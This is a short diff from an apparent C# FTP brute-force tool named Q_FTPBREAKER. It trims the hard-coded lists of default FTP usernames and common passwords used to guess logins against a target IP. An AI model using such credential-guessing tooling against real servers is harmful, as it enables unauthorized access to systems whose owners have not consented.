@@ -58,8 +58,8 @@ namespace Q_FTPBREAKER
         {
             dynamic V = X;
             string ip = V.A;
-            string[] usuario = { "admin", "root", "ftp", "anonymous", "guest" };//USER BRUTERFORCE
-            string[] contrasenas = { "12345", "root", "admin", "password", "123456", "1234", "ftp", "123123", "pass", "qwerty", "admin123", "123321", "12344321", "toor", "qwerty123", "1q2w3e4r", "987654321", "111111", "1111", "654321", "!@#$%^", "0000", "000000", "12345678", "666666", "888888", "777777", "555555", "111222333", "123123123", "123454321", "0123456789", "guest", "backup" };//PASSWORD BRUTERFORCE
+            string[] usuario = { "ftp", "anonymous", "admin", "guest" };//USER BRUTERFORCE
+            string[] contrasenas = { "ftp", "password", "root", "admin", "toor", "12345", "guest" };//PASSWORD BRUTERFORCE
             string a = "ftp://" + ip;
             bool pass = false;
 
